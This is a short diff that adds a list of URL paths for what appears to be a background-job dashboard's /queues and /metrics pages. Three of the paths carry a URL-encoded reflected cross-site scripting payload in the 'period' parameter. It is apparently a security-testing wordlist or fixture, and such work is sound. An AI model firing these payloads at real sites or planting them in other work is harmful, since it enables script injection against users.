@@ -1,0 +1,4 @@
+/queues
+/metrics?period=%22%3E%3Cimg/src/onerror=alert(document.domain)%3E
+/metrics/SanityChecksJob?period=%22%3E%3Cimg/src/onerror=alert(document.domain)%3E
+/metrics/ActiveStorage::PurgeJob?period=%22%3E%3Cimg/src/onerror=alert(document.domain)%3E
